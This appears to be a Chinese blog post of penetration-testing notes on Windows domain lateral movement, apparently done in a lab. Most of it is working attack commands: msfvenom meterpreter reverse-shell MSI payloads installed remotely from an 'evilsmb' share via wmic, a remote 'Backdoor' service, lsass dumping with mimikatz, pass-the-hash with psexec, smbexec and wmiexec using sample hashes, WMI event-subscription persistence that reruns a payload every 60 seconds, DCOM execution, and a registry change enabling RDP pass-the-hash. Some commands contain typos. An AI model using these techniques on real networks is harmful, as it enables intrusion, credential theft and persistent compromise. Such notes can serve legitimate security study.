<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用msf生成一个msi恶意文件</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 Lport=4444 -f msi -o reverse_tcp.msi</span><br><span class="line">建立共享服务器SMB</span><br><span class="line">在跳板机上执行</span><br><span class="line">wmic /node:192.168.30.10 /user:Administrator /password:Admin!@#45 priduct call install PackageLocation=&quot;\\SMB服务器IP\服务名\reverse_tcp.msi&quot;</span><br></pre></td></tr></table></figure></div>

<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="winRM的利用"><a href="#winRM的利用" class="headerlink" title="winRM的利用"></a>winRM的利用</h3><p>通过winRM执行远程命令</p>
<p>执行以下命令，手动将目的IP添加到客户端信任列表TrustedHosts</p>
<p><code>winrm set winrm/config/client @&#123;TrustedHosts=&quot;192.168.30.10&quot;&#125;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317220135483.png"
                      alt="image-20230317220135483"
                ></p>
<p><code>Set-Item WSMan:localhost\client\trustedhosts -value *</code></p>
<p>上面这个命令是在powershell上面执行的</p>
<h6 id="winrs"><a href="#winrs" class="headerlink" title="winrs"></a>winrs</h6><p>Winrm是Windows远程管理的客户端程序，允许通过提供的用户凭据，在winRM服务器上执行命令</p>
<p>在远程主机上执行<code>winrs -r http://192.168.30.10:5985 -u:Administrator -p:Admin!@#45 &quot;whoami&quot;</code></p>
<p>也可以直接在上面whoami的位置输入cmd打开cmd</p>
<h6 id="Winrm-cmd"><a href="#Winrm-cmd" class="headerlink" title="Winrm.cmd"></a>Winrm.cmd</h6><p>Winrm.cmd允许WMI对象通过WinRM传输进行远程交互</p>
<h3 id="系统服务利用"><a href="#系统服务利用" class="headerlink" title="系统服务利用"></a>系统服务利用</h3><h4 id="创建远程服务"><a href="#创建远程服务" class="headerlink" title="创建远程服务"></a>创建远程服务</h4><p>先建立ipc共享</p>
<p>然后<code>sc \\192.168.30.30 create Backdoor binpath= &quot;cmd.exe /k C:\rever_tcp.exe&quot;</code></p>
<p>注意&#x3D;后面要有空格</p>
<p>执行<code>sc \\192.168.30.30 start Backdoor</code></p>
<p>删除服务<code>sc \\192.168.30.30 delete Backdoor</code></p>
<h4 id="利用全部步骤："><a href="#利用全部步骤：" class="headerlink" title="利用全部步骤："></a>利用全部步骤：</h4><p>先利用信息收集部分的指令得到该域内各个主机的地址信息等</p>
<p>for &#x2F;L %I in (1,1,254) Do @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”  检测存活ip</p>
<p>再利用mimikatz获取已控制主机的密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301154749779.png"
                      alt="image-20230301154749779"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301154815697.png"
                      alt="image-20230301154815697"
                ></p>
<p>然后利用批量impacket脚本批量探测，再找到另外一个主机一样的密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301161036660.png"
                      alt="image-20230301161036660"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301155730960.png"
                      alt="image-20230301155730960"
                ></p>
<p>发现有一个具有system权限，说明该主机有跟本主机一样的密码，</p>
<p>所以可以在现在发现的这个主机上再次使用mimikatz找新的密码，然后以此类推用这个密码再次探测各个主机地址</p>
<p>直到找到域控密码</p>
<p>得到密码之后就可以利用at或者schtasks进行攻击，至此完整过程完成</p>
<h4 id="psexec-amp-smbexec以及wmic-amp-wmiexec"><a href="#psexec-amp-smbexec以及wmic-amp-wmiexec" class="headerlink" title="psexec&amp;smbexec以及wmic&amp;wmiexec"></a>psexec&amp;smbexec以及wmic&amp;wmiexec</h4><p>前瞻知识：</p>
<p>1.windows2012之后系统默认关闭wigest，攻击者无法从内存中获取明文密码，2012之前的版本如果安装KB2871997补丁。也会导致这样</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302091720681.png"
                      alt="image-20230302091720681"
                ></p>
<h5 id="procdump-mimikatz的配合获取"><a href="#procdump-mimikatz的配合获取" class="headerlink" title="procdump+mimikatz的配合获取"></a>procdump+mimikatz的配合获取</h5><p>procdump -accepteula -ma lsass.exe lsass.dmp  </p>
<p>   #在目标主机上执行该条命令，得到了lsass.dmp文件，之后就是将这个文件移动到我们的本地主机，使用mimikatz进行恢复</p>
<p>然后在mimikatz上执行</p>
<p>privilege::debug</p>
<p>sekurlsa::minidump lsass.dmp </p>
<p>sekurlsa::logonpasswords full</p>
<p>原理：Mimikatz属于第三方软件，直接上传到目标主机可能 杀毒软件查杀，这时我们可以配合官方软件Procdump，将Procdump上传目标主机获取用户信息(该文件不可读)，使用本地的Mimikatz打开Procdump获取的用户信息。</p>
<h5 id="hashcat破解NTLM-hash-kali系统自带"><a href="#hashcat破解NTLM-hash-kali系统自带" class="headerlink" title="hashcat破解NTLM hash(kali系统自带)"></a>hashcat破解NTLM hash(kali系统自带)</h5><p>—爆破命令：hashcat -a 0 -m 1000 hash file –force</p>
<p>—-a, –attack-mode&#x3D;NUM         攻击模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。（这里是字典攻击）</p>
<p>— -m 1000指向的是NTLM Hash哈希协议</p>
<p>—hash是要破解的哈希字符串，file为字典的地址</p>
<h5 id="域横向移动smb服务利用–psexec，，smbexec（官方自带）"><a href="#域横向移动smb服务利用–psexec，，smbexec（官方自带）" class="headerlink" title="域横向移动smb服务利用–psexec，，smbexec（官方自带）"></a>域横向移动smb服务利用–psexec，，smbexec（官方自带）</h5><p>利用smb服务可以通过明文或者hash传递来远程执行，必要条件是445端口要开启和Admin$共享</p>
<p>主要连接到SMB服务端的Admin$共享，并且释放psexesvc.exe，注册PSEXESVC服务，然后通过PSEXESVC服务进行命令执行</p>
<p>简要来说就是用这些工具来远程得到目标主机的system权限</p>
<h6 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h6><p>存在两种连接方式：</p>
<ol>
<li>先有 ipc 链接，psexec 需要明文或hash 传递</li>
</ol>
<p>先建立ipc连接：<code>net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administrator（密码是前期信息收集获取）</code></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/61ebf51eba2c47386868d4c0c3ad5be5aab0cadb.png@831w_224h_progressive.webp"
                      alt="img" style="zoom:150%;" 
                >

<p>—以system权限运行cmd: psexec \192.168.3.32 -s cmd（发现为系统权限）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/81503bc903d891f81ae6212759bd1e9c9ece321a.png@824w_354h_progressive.webp"
                      alt="img"
                ></p>
<p>2.不用建立IPC直接提供明文账户密码（推荐原因：建立IPC链接可能会失败）</p>
<p><code>psexec --accepteula \\192.168.3.21 -u（用户） administrator -p（密码） Admin12345 -s（系统权限） cmd（运行cmd） </code></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9695a079ec035707a26619612833bd79c3a062e8.png@831w_246h_progressive.webp"
                      alt="img" style="zoom:150%;" 
                >



<p>如果没有明文密码，只有hash密码的话官方的pstools不能使用，这时候就需要使用impacket中别人二改的psexec.exe</p>
<p>psexec.exe -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;<a class="link"   href="mailto:&#x61;&#100;&#109;&#x69;&#110;&#105;&#115;&#x74;&#x72;&#97;&#116;&#111;&#114;&#x40;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#51;&#x2e;&#51;&#50;" >&#x61;&#100;&#109;&#x69;&#110;&#105;&#115;&#x74;&#x72;&#97;&#116;&#111;&#114;&#x40;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#51;&#x2e;&#51;&#50; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<h6 id="smbexec（无需先ipc连接-明文传递）"><a href="#smbexec（无需先ipc连接-明文传递）" class="headerlink" title="smbexec（无需先ipc连接 明文传递）"></a>smbexec（无需先ipc连接 明文传递）</h6><p>连接sqlserver的非域内主机</p>
<p>smbexec .&#x2F;administrator:admin!@#45  @192.168.3.32 </p>
<p>链接sqlserver的域内用户</p>
<p>smbexec .god&#x2F;administrator:Admin12345  @192.168.3.32</p>
<p>建立哈希连接（sqlserver的非域管理员）：</p>
<p>smbexec -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;administrator  @192.168.3.32 </p>
<p>通过域用户中域管理员登陆sqlserver服务器（域管理员可以登陆域内任意主机）</p>
<p>smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god&#x2F;<a class="link"   href="mailto:&#97;&#x64;&#109;&#105;&#x6e;&#105;&#x73;&#116;&#114;&#x61;&#116;&#x6f;&#114;&#64;&#49;&#57;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#x33;&#x2e;&#x33;&#x32;" >&#97;&#x64;&#109;&#105;&#x6e;&#105;&#x73;&#116;&#114;&#x61;&#116;&#x6f;&#114;&#64;&#49;&#57;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#x33;&#x2e;&#x33;&#x32; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h6 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h6><p>使用命令</p>
<p><code>wmiexec HACK-MY/Administrator:Admin!@#45@192.168.30.10</code>连接域内主机，就可以远程命令控制</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317202047275.png"
                      alt="image-20230317202047275"
                ></p>
<h5 id="域横向移动WMI服务利用"><a href="#域横向移动WMI服务利用" class="headerlink" title="域横向移动WMI服务利用"></a>域横向移动WMI服务利用</h5><p>WMI是一种Windows管理规范可以通过WMI管理本地用户和远程计算机，提供两个协议分布式组件对象模型、Windows远程管理</p>
<p>WMI服务是通过本地135端口进行利用的，支持用户名明文或者哈希的方式进行认证，并且该方法不会在目标日志系统留下痕迹</p>
<p>常见的控制方法有</p>
<p>1.通过调用WMI的类的方法进行远程执行如Win32_Process类中的Create方法可以远程主机上创建进程，利用install安装恶意MSI</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用metasploit生成恶意的MSI</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 LPORT=4444 -F MSI -O reverse_tcp.msi</span><br><span class="line">服务器上搭建SMB共享服务器，并放入msi</span><br><span class="line">跳板机上执行</span><br><span class="line">wmic /node:101.10.10.19 /user:Administrator /password:Admin@123 product call install packageLocation=&quot;\\192.168.2.143\evilsmb\reverse_tcp.msi&quot;</span><br><span class="line">成功获取权限</span><br></pre></td></tr></table></figure></div>



<p>2.远程部署WMI实践订阅，条件触发攻击</p>
<p>1.自带WMIC明文传递 无回显</p>
<p>wmic &#x2F;node:192.168.3.21 &#x2F;user:administrator &#x2F;password:Admin12345 process call create “cmd.exe &#x2F;c ipconfig &gt;C:\1.txt”</p>
<p>2.自带cscript明文传递，有回显（需要wmiexec.vbs文件，不支持hash）</p>
<p>cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.3.21 administrator Admin12345 </p>
<p>3.impacket wmiexec套件，明文传递，支持hash，有回显，但是得做免杀</p>
<p>连接域sqlserver执行命令：</p>
<p>wmiexec .&#x2F;administrator:admin!@#45    @192.168.3.32 “whoami”（或者”ipconfig”） </p>
<p>明文连接域控：</p>
<p>wmiexec god&#x2F;administrator:Admin12345    @192.168.3.21 “whoami”</p>
<p>哈希分别连接sqlserver和域控</p>
<p>wmiexec -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;<a class="link"   href="mailto:&#97;&#x64;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#114;&#x40;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#51;&#x2e;&#51;&#x32;" >&#97;&#x64;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#114;&#x40;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#51;&#x2e;&#51;&#x32; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> “whoami”</p>
<p>wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god&#x2F;<a class="link"   href="mailto:&#x61;&#x64;&#x6d;&#x69;&#110;&#105;&#115;&#x74;&#114;&#x61;&#116;&#111;&#114;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#x33;&#x2e;&#x32;&#x31;" >&#x61;&#x64;&#x6d;&#x69;&#110;&#105;&#115;&#x74;&#114;&#x61;&#116;&#111;&#114;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#x33;&#x2e;&#x32;&#x31; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> “whoami”</p>
<h6 id="WMI订阅事件"><a href="#WMI订阅事件" class="headerlink" title="WMI订阅事件"></a>WMI订阅事件</h6><p>相当于一个条件触发事件，其中条件被称为“事件过滤器”，做出的响应称为“事件消费者”</p>
<p>部署事件订阅的时候，需要分别构建Filter以及Consumer，且绑定一起</p>
<p>手动利用</p>
<p>1.整合PSCredential用于后续过程的认证</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$Username= &quot;HACK-MY\Administrator&quot;</span><br><span class="line">$Password=&quot;Admin!@#45&quot;</span><br><span class="line">$SecurePassword= $Password | ConvertTo-SecureString -AsPlainText -Force</span><br><span class="line">$Credential = New-Object -Typename Syetem.Management.Automation.PSCredential -ArgumentList $Username,$SecurePassword</span><br></pre></td></tr></table></figure></div>

<p>2.设置攻击目标和其他公共参数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$GlobalArgs = @&#123;&#125;</span><br><span class="line">$ComputerName =&quot;192.168.30.10&quot;</span><br><span class="line">$GlobalArgs[&#x27;Credential&#x27;] = $Credential</span><br><span class="line">$GlobalArgs[&#x27;ComputerName&#x27;] = $ComputerName</span><br></pre></td></tr></table></figure></div>

<p>3.在远程主机上部署RestFilter</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$EventFilterArgs = @&#123;</span><br><span class="line">       EventNamespace = &#x27;root/cimv2&#x27;</span><br><span class="line">       Name = &quot;TestFilter&quot;</span><br><span class="line">       Ouery = &quot;SELECT * FROM Win32_ProcessStartTrace where processname =&#x27;svchost.exe&#x27;&quot;</span><br><span class="line">       QueryLanguage =&#x27;WQL&#x27;</span><br><span class="line">             &#125;</span><br><span class="line">$EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $EventFilterArgs @GlobalArgs</span><br></pre></td></tr></table></figure></div>

<p>4.在远程主机部署一个叫“TestConsumer”的事件消费者</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$CommandLineEventConsumerArgs =@&#123;</span><br><span class="line">          Name =&quot;TestConsumer&quot;</span><br><span class="line">          CommandLineTemplate =&quot;C:\Windows\System32\cmd.exe /c calc.exe&quot;</span><br><span class="line">                                &#125;</span><br><span class="line">$EventConsumer = Set-WmiInstance -Namespace root \subscription -Class</span><br><span class="line">    CommandLineEventConsumer -Arguments $CommandLineEventConsumerArgs @GlobalArgs</span><br></pre></td></tr></table></figure></div>

<p>5.将事件消费者和事件过滤器绑定一起</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$FilterConsumerBindingArgs= &#123;</span><br><span class="line">      Filter = $EventFilter</span><br><span class="line">      Consumer = $EventConsumer</span><br><span class="line">                            &#125;</span><br><span class="line">$FilterConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class</span><br><span class="line">    __FilterToConsumerBinding -Arguments $FilterConsumerBindingArgs @GlobalArgs</span><br></pre></td></tr></table></figure></div>

<p>如此一个事件订阅已经部署了，当远程系统轮询到svchost.exe进程产生时，将通过事件消费者执行系统命令来启动cale.exe进程</p>
<p>Sharp-WMIEvent利用</p>
<p>1.先在smb共享服务器上放入攻击载荷</p>
<p>2.在跳板机上执行以下命令，运行Sharp-WMIEvent</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -CommputerName 192.168.30.10 -Domain hack-my.com -Username Administrator -Password Admin!@#45 -Command &quot;cmd.exe / c \\SMB服务器IP\evilsmb服务名称\reverse_tcp.exe&quot;</span><br></pre></td></tr></table></figure></div>

<p> 这会在远程主机上部署一个随机命名的永久事件订阅，并每隔60秒执行以此攻击载荷，使远程主机上线</p>
<h5 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h5><p>1.信息收集，mimikatz实现密码收集</p>
<p>2.使用命令检测存活ip     for &#x2F;L %I in (1,1,254) Do @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”     并排除自己本机的IP地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302112713483.png"
                      alt="image-20230302112713483"
                ></p>
<p>然后收集域用户信息</p>
<p>3.通过ipc等连接来验证域内主机的用户和密码</p>
<p>4.通过命令或者工具箱进行提权</p>
<p>5.重复进行操作，直到获取域控的权限</p>
<h5 id="域横向移动以上服务hash批量利用-python编译exe"><a href="#域横向移动以上服务hash批量利用-python编译exe" class="headerlink" title="域横向移动以上服务hash批量利用-python编译exe"></a>域横向移动以上服务hash批量利用-python编译exe</h5><p>—收集明文或哈希密码（这个是Web本地用户）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/c254c9e8488c3621f704255c4119d978a5398b34.png@783w_288h_progressive.webp"
                      alt="img"
                ></p>
<p>—探测同网段存活主机</p>
<p>for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”（用for循环去ping1-254网段的主机，这是自带内部命令，不会被杀毒软件拦截，我这里只开了DC&#x2F;WEB&#x2F;SQL&#x2F;File）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/a32f6cd76d5f7ee9d05348ab3ca8f1d622c0978c.png@831w_87h_progressive.webp"
                      alt="img"
                ></p>
<p>—探测域内用户</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/b19abce24e85642feee983b541402857a2f72f1c.png@831w_408h_progressive.webp"
                      alt="img"
                ></p>
<p>#至此，我们已经收集到了IP，用户名，和密码hash。我们可以写一个python脚本，然后转换成exe批量利用</p>
<p>—写入ip字典，用户字典，哈希密码字典</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/cfa491a8137591a7437af3f5eb8c7b177b994d25.png@597w_527h_progressive.webp"
                      alt="img" style="zoom:150%;" 
                >

<p>—ip、用户、哈希密码三重变化，连接域用户和本地用户</p>
<p>—采用套件impacket包中，wmiexec明文或hash传递，有回显exe版本，但是易被杀（要做免杀）（这里注意whoami前面有空格）</p>
<p>—并且该方法不会在目标日志系统留下痕迹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/0e2b7e27c57a91b1367529f3ab5d0727aa245468.png@831w_371h_progressive.webp"
                      alt="img"
                ></p>
<p>—将Python脚本复制到Script目录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/1d73721d1e18e01d245ad03070eb2cc5865f81c4.png@813w_209h_progressive.webp"
                      alt="img"
                ></p>
<p>—在Script目录执行命令：pyinstaller.exe -F fuck_neiwang_002.py</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/838ea2110e71032e60b3fd71e1e729bcad2256e3.png@831w_252h_progressive.webp"
                      alt="img"
                ></p>
<p>—在Script目录下dist目录发现exe文件，复制到域Web靶机执行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/308612a5f913f9ea1cee905ff22db757ddf83d96.png@831w_234h_progressive.webp"
                      alt="img"
                ></p>
<p>—运行exe文件，注意要和impacket包中wmiexec.exe文件同路径</p>
<p>—发现192.168.3.32的本地管理员用户（Administrator）和字典的哈希密码一致</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/15d8f700dd18d364be7f668e7db63bd273d42146.png@831w_129h_progressive.webp"
                      alt="img"
                ></p>
<p>—在192.168.3.32主机运行minikatz，获取到一个新的密码hash（第一个是连接的，第二个是新获取的，假设只找到了hash）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/6cb861791e073abaf6e6aecac1036b3c8f68c756.png@831w_336h_progressive.webp"
                      alt="img"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/091c2301d888752e9bb70dcf4c48182ec8a712a8.png@831w_266h_progressive.webp"
                      alt="img"
                ></p>
<p>—但是查看域用户发现没有这个sqlserver的用户</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/1331e4aed28b4e607714d79bd8634b54fdb5224f.png@831w_306h_progressive.webp"
                      alt="img"
                ></p>
<p>—在sqlserver本地查看，也没有sqlserver用户，由于是连接的本地用户，所以盲猜是本地用户的一个哈希密码，但是不知道是以下哪一个。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/d610ad1369fe1a88ccf868c2db805d4ba1dbb403.png@735w_236h_progressive.webp"
                      alt="img"
                ></p>
<p>—不知道为啥SQL的主机的域dbadmin用户没连接上，他俩的密码都是一样的，按道理本地连接上了域用户也可以才对</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/4779e1676f6086f5e8a9a99ca3b76ec0a061dc08.png@831w_108h_progressive.webp"
                      alt="img"
                ></p>
<p>—通过在sqlserver上获取的密码和用户账户，添加到Python脚本的字典里面，那么能够获取的域内用户的哈希密码越来越多</p>
<p>—这里一般都获取到域内主机的本地用户的密码，我猜测通过这些哈希密码字典去爆破域控。因为即使获取到域内用户的正确密码，但是没有域管理员权限是无法通过mimikatz获取内存的密码。</p>
<p>—但是即使如此，我们可以通过搜集域内用户的凭据信息来丰富明文和哈希字典</p>
<h4 id="域横向COM和DCOM"><a href="#域横向COM和DCOM" class="headerlink" title="域横向COM和DCOM"></a>域横向COM和DCOM</h4><h6 id="1-COM"><a href="#1-COM" class="headerlink" title="1. COM"></a>1. COM</h6><p>com是微软的一套软件组件的二进制接口标准，使跨编程语言的进程间通信、动态对象创建成为可能</p>
<h6 id="2-DCOM"><a href="#2-DCOM" class="headerlink" title="2. DCOM"></a>2. DCOM</h6><p>DCOM 是基于组件对象模型的一系列概念和程序接口，支持不同机器上的组件间的通信。利用DCOM，客户端程序能够请求来自网络中另一台计算机上的服务器程序对象</p>
<h5 id="通过DCOM横向移动"><a href="#通过DCOM横向移动" class="headerlink" title="通过DCOM横向移动"></a>通过DCOM横向移动</h5><p>可以使用<code>Get-CimInstance win32_dcomapplication</code>这个命令列出计算机上所有的DCOM组件</p>
<h6 id="1-MMC20-Application"><a href="#1-MMC20-Application" class="headerlink" title="1.MMC20.Application"></a>1.MMC20.Application</h6><p>利用MMC20.Application组件在远程主机上执行攻击荷载，并上线meterpreper</p>
<ol>
<li><p>在一台可控服务器上搭建smb匿名共享服务，并将生成发攻击荷载放入共享目录。</p>
</li>
<li><p>在管理员权限的powershell中执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过ProgID与DCOM进行远程交互，并创建MMC20.Application对象的实例</span><br><span class="line">$com=[activator]::createinstance([type]::GetTypeFromProID(&quot;MMC20.Application&quot;,&quot;10.10.10.19&quot;))</span><br><span class="line">调用ExecuteShellCommond方法启动进程，以运行攻击载荷</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommond(&#x27;cmd.exe&#x27;,$null,&quot;/c\\192.168.2.134\evilsmb&quot;)</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p>2.ShellWindows</p>
<h4 id="域横向PTH-amp-PTK-amp-PTT"><a href="#域横向PTH-amp-PTK-amp-PTT" class="headerlink" title="域横向PTH&amp;PTK&amp;PTT"></a>域横向PTH&amp;PTK&amp;PTT</h4><h6 id="PTH-利用LM或NTLM的值进行的渗透测试"><a href="#PTH-利用LM或NTLM的值进行的渗透测试" class="headerlink" title="PTH  利用LM或NTLM的值进行的渗透测试"></a>PTH  利用LM或NTLM的值进行的渗透测试</h6><p>PTH在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash 和NTLM Hash访问远程主机或者服务，而不用提供明文密码</p>
<p>如果禁用了NTLM认证，PsExec无法利用获得的NTLM Hash进行远程连接，但是使用mimlata还是可以攻击成功。对于8.1&#x2F;2012r2，安装补丁kb28719987发的win7&#x2F;2008r2&#x2F;8&#x2F;2012等，可以使用费AES keys代替NT hash来实现PTK攻击</p>
<h6 id="PTT-利用票据凭证TGT进行的渗透测试"><a href="#PTT-利用票据凭证TGT进行的渗透测试" class="headerlink" title="PTT   利用票据凭证TGT进行的渗透测试"></a>PTT   利用票据凭证TGT进行的渗透测试</h6><p>可以理解为网站的cookie，就是一中和别人建立连接的凭据，利用这个凭据可以再次和别人建立连接</p>
<p>ptt攻击不是简单的NTLM认证，同时利用kerberos协议进行攻击的</p>
<p>攻击方式有ms14-068、黄金票据和白银票据</p>
<p>ms14-068的危害是允许域内任何一个普通用户，，将自己提升至域管理权限。微软给处补丁kb3011780来修复</p>
<h6 id="PTK-利用ekeys-aes256进行的渗透测试"><a href="#PTK-利用ekeys-aes256进行的渗透测试" class="headerlink" title="PTK   利用ekeys   aes256进行的渗透测试"></a>PTK   利用ekeys   aes256进行的渗透测试</h6><p>sekurlsa::ekeys得到aes256的值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302151158779.png"
                      alt="image-20230302151158779"
                ></p>
<h5 id="PTH传递-mimikatz"><a href="#PTH传递-mimikatz" class="headerlink" title="PTH传递-mimikatz"></a>PTH传递-mimikatz</h5><p>使用mimikatz获取密码等信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302150502637.png"
                      alt="image-20230302150502637"
                ></p>
<p>在mimikatz里面使用   sekurlsa::pth（通过PTH连接） &#x2F;user（用户名）:administrator     &#x2F;domain（域名）:god       &#x2F;ntlm（哈希密码）:ccef208c6485269c20db2cad21734fe7</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302152334981.png"
                      alt="image-20230302152334981"
                ></p>
<p>该命令是通过hash来连接到域控主机</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302152418333.png"
                      alt="image-20230302152418333"
                ></p>
<p>即可得到控制权，然后就可以用at&amp;schtasks来进行后门的注入，如果权限不够就涉及提权了</p>
<p>对于上面提到的微软打的补丁，没有打补丁的适用于这个方法，打了补丁只能administrator连接</p>
<h5 id="利用哈希传递登入远程桌面"><a href="#利用哈希传递登入远程桌面" class="headerlink" title="利用哈希传递登入远程桌面"></a>利用哈希传递登入远程桌面</h5><p>条件：1.远程主机开启了“受限管理员”模式</p>
<p>​            2.用户位于远程主机的管理员组中</p>
<p>​            3.目标用户的哈希</p>
<p>开启”受限管理员“模式,win8.1 win server 2012 R2默认开启</p>
<p>手动开启<code>reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG-dword /d 00000000 /f</code></p>
